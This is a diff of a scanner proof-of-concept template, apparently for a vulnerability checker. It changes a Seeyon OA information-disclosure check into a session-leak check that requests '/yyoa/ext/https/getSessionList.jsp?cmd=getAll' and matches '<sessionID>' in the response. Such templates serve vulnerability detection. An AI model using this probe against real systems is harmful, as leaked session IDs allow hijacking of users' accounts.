@@ -1,6 +1,6 @@
 #poc名称
 - name:
-  - name: "SeeyouOA_A6_initDataAssess_Disclosure_of_sensitive_user_information"
+  - name: "SeeyouOA_getSessionList_Session_Leak"
 
 #请求方式
 - method:
@@ -13,11 +13,11 @@
 #response包里的关键字
 - word:
   - word:
-      - "personList"
+      - "<sessionID>"
 
 #漏洞的位置
 - url:
-  - url : "/yyoa/assess/js/initDataAssess.jsp"
+  - url : "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
 
 #验证是否攻击成功的 请求方式
 - method-V:
